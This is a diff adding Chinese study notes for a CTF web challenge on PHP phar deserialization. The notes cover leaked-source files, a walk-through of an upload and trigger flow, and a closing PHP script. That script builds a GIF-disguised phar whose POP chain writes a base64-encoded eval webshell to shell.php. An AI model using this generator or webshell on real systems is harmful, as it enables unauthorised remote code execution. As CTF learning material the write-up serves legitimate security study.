@@ -1914,8 +1914,181 @@ phar 文件的**元数据（manifest）**里存着序列化的对象。
 - `file_exists()` / `file_get_contents()`
 - `getimagesize()` / `filesize()`
 - `file()` / `fopen()`
+### 为什么用箭头(->)？
 
+因为对象是一个 "东西"，你要从这个东西上**取东西**或者**让它做事**，就用箭头指过去
+```php
+$cat  ->  name（可以读作cat的名字，->译为“的”）
+  ↑       ↑
+  对象    从这个对象上取什么
+  ```
+### 两种用法
 
+**① 取属性（取东西）**
+
+```
+$e->driver       // 取 $e 对象的 driver 属性
+$e->driver->path // 取 $e 的 driver 对象的 path 属性
+```
+
+**② 调方法（让它做事）**
+
+```
+$e->driver->save()  // 让 $e 的 driver 对象执行 save() 动作
+```
+
+后面带 `()` 的就是 "让它做事"，不带 `()` 的就是 "取东西"。
+
+ps：
+```php
+$e->driver = new FileDriver();   // 给 $e 的 driver 属性塞一个 FileDriver 对象
+$e->driver = new FileDriver();
+//  ↑     ↑      ↑
+//  对象  属性    给属性赋的值
+```
+**`$this` 是什么？**
+
+`$this` 是 PHP 里的特殊变量，意思是 **"当前这个对象自己"**。
+```php
+$this  ->  driver  ->  save()
+ │         │          │
+ │         │          └─ 调用 save() 方法
+ │         └─ 取出 driver 属性
+ └─ "当前这个对象"
+```
+> **`->` 就是 "的"，从一个对象上拿东西、叫它做事。**
 ---
-### 1.源码
-##### 
+## 1.分析题目
+##### 1.phar.通常指的是php文件的zip压缩包集合，`phar://` 会触发反序列化
+<font color="red">但原题目没有给出源码，先看看上传gif文件后有没有什么有用的返回</font>
+![alt text](image-28.png)
+上传成功，
+![alt text](image-29.png)
+
+
+##### 2.想到
+###### 1. 常见的源码泄露方式
+
+做 Web 题时，源码不会直接摆在你面前。但开发者经常**忘删**一些东西，比如：
+
+表格
+
+| 文件名 | 怎么来的 |
+| --- | --- |
+| `www.zip` / `www.tar.gz` | 打包整个网站准备上传到服务器，忘删了 |
+| `backup.zip` / `1.zip` | 备份文件 |
+| `.git/` | 用 git 部署网站，没删 .git 目录 |
+| `.svn/` | 旧版 SVN 版本控制目录 |
+| `.DS_Store` | macOS 自动生成的文件 |
+| `index.php.bak` / `index.php~` | 编辑器备份文件 |
+
+**这些都是 "开发者不小心留在服务器上的"，攻击者直接访问就能下载源码。**
+###### 2.先一个个访问看
+1.<font color="red">访问/www.zip,得到</font>
+![alt text](image-30.png)
+
+##### 2.查看有什么（一共三个，读懂源码）
+##### 1.上传逻辑(upload.php)
+![alt text](image-33.png)
+表格
+
+| 行 | 代码 | 解释 |
+| --- | --- | --- |
+| 2 | `if (isset($_FILES['file']))` | 判断有没有上传文件（表单字段名叫 file） |
+| 3 | `file_get_contents(tmp_name)` | 读取上传的临时文件内容 |
+| 4 | `substr($content, 0, 3) !== 'GIF'` | **检查前 3 个字节是不是 "GIF"** |
+| 5-6 | 输出 "只允许 GIF" 并退出 | 不是 GIF 直接拒绝 |
+| 8 | `md5(uniqid()) . '.gif'` | 生成随机文件名：32 位随机字符 + .gif 后缀 |
+| 9 | `move_uploaded_file(...)` | 把临时文件移到 uploads/ 目录，用随机名 |
+|注意|**注意**：文件**先存进去了**，后面才检查是不是真图。|
+| 11 | `getimagesize(...)` | 用 PHP 内置函数检查是不是真图片（读图片尺寸） |  |  |
+| 12 | `!$info |  | 尺寸 > 8000` | 如果不是图片，或图片太大 |
+| 13 | `usleep(500000)` | **睡 0.5 秒**（500000 微秒 = 0.5 秒） |  |  |
+| 14 | `unlink(...)` | 0.5 秒后**删除文件** |  |  |
+| 15 | 输出 "不是合法图片，已删除" | 告诉用户被删了 |  |  |
+| 17 | 否则输出 "上传成功" | 真图就保留 |  
+
+##### 2.触发点(index.php)
+![alt text](image-34.png)
+
+| 行 | 代码 | 解释 |
+| --- | --- | --- |
+| 2 | `require_once 'class.php'` | **加载 class.php**（Cache 和 FileDriver 类已定义） |
+| 4 | `if (isset($_GET['file']))` | 判断 URL 有没有传 file 参数 |
+| 5 | `file_get_contents($_GET['file'])` | **读取我们指定的文件** |
+| 6 | 成功 / 失败提示 | 只告诉你读没读到，不返回内容 |
+| 25 | `glob('uploads/*')` | **列出 uploads 目录所有文件** |
+| 27-28 | 循环输出 `<img>` | 把所有文件显示在图库页面 |
+
+<font color="red">
+
+##### 漏洞就在第 5 行：
+
+- 我们传 `file=phar://uploads/xxx.gif`
+- `file_get_contents` 看到 `phar://` 前缀
+- 自动解析 phar 文件，反序列化里面的 Cache 对象
+- 脚本结束 → Cache 销毁 → 触发 `__destruct()` → 写 shell.php
+- 27.28.**这行也是关键**：我们可以通过刷新 index.php，从图库页面的 HTML 里**读出 uploads 目录里有哪些文件**，从而发现刚上传的随机文件名。
+
+
+###### 3.pop链定义(class.php)
+![alt text](image-31.png)
+
+| 行 | 代码 | 解释 |
+| --- | --- | --- |
+| 2 | `class Cache` | 定义一个叫 Cache 的类（缓存） |
+| 3 | `public $driver` | 有个公开属性 `$driver`，类型不限制，可以塞任何对象进去 |
+| 4 | `__destruct()` | **魔术方法**：对象被销毁时自动执行（脚本结束时自动触发） |
+| 5 | `if ($this->driver)` | 如果 driver 属性有值（不为空） |
+| 6 | `$this->driver->save()` | 调用 driver 对象的 `save()` 方法 |
+| 11 | `class FileDriver` | 文件驱动类（负责写文件） |
+| 12 | `public $path` | 要写入的文件路径（我们控制） |
+| 13 | `public $data` | 要写入的内容（我们控制） |
+| 14 | `function save()` | 保存方法 |
+| 15 | `file_put_contents($path, $data)` | **核心：把 data 写入 path 文件** ，file_put_contents("hello.txt", "你好世界");// 在服务器上创建一个 hello.txt，内容是"你好世界"|
+
+**`@` 符号**：忽略这行可能产生的报错（比如路径不存在不提示）。
+</font>
+##### 4.三个文件关系图(攻击参考图)
+```php
+upload.php（上传）
+  ↓ 存文件到 uploads/随机名.gif
+  ↓ 0.5秒后删除
+
+index.php（触发 + 列表）
+  ↓ file=phar://uploads/随机名.gif
+  ↓ 反序列化 Cache 对象
+
+class.php（POP链）
+  ↓ Cache::__destruct()
+  ↓ FileDriver::save()
+  ↓ file_put_contents("shell.php", "一句话")
+  ↓ 写成功！
+```
+```php
+<?php
+// 定义题目里的两个类（必须和题目一样）
+class Cache { public $driver; }
+class FileDriver { public $path; public $data; }
+
+// 构造 POP 链
+$e = new Cache();
+$e->driver = new FileDriver();
+$e->driver->path = "shell.php";
+$e->driver->data = base64_decode("PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=");
+
+// 伪装成 GIF 的头部（43字节完整合法GIF）
+$gif = hex2bin("47494638396101000100800000000000ffffff21f90401000000002c00000000010001000002024401003b");
+$stub = $gif . "<?php __HALT_COMPILER(); ?>";
+
+// 生成 phar
+$tmp = "C:/Users/j/Desktop/p.phar";
+@unlink($tmp);
+$p = new Phar($tmp);
+$p->setStub($stub);
+$p->setMetadata($e);
+$p["a.txt"] = "x";
+$p = null;
+
+echo "done\n";
+```
